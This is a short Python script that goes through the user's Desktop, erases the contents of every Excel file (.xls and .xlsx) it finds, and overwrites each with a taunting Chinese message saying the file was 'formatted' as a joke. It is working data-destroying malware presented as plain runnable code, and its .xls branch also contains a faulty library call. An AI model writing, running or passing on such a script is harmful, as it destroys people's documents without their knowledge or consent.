import os
from openpyxl import load_workbook
from openpyxl.styles import Font
import xlrd
import xlwt
def clear_and_mark_excel(file_path, file_type):
    if file_type == 'xlsx':
        wb = load_workbook(file_path)
        ws = wb.active  
        for row in ws.iter_rows(min_row=1, max_row=ws.max_row, min_col=1, max_col=ws.max_column, values_only=False):
            for cell in row:
                cell.value = None

        mark_cell = ws.cell(row=1, column=1)
        mark_cell.value = "文件已经被我格式化了笑死我了！"
        mark_cell.font = Font(bold=True) 
        wb.save(file_path)
    elif file_type == 'xls':
        wb = xlrd.open_workbook(file_path, formatting_info=True)
        ws = wb.sheet_by_index(0) 
        new_wb = xlwt.Workbook()
        new_ws = new_wb.add_sheet('Sheet1')
        new_ws.write(0, 0, "文件已被格式化了哈哈哈")
        new_ws.write(0, 0, "文件已被格式化哈哈哈哈", font=xlwt.Font(name='Arial', bold=True))
        new_wb.save(file_path)
desktop = os.path.join(os.path.expanduser("~"), "Desktop")
for file in os.listdir(desktop):
    file_path = os.path.join(desktop, file)
    if file.endswith('.xls'):
        clear_and_mark_excel(file_path, 'xls')
    elif file.endswith('.xlsx'):
        clear_and_mark_excel(file_path, 'xlsx')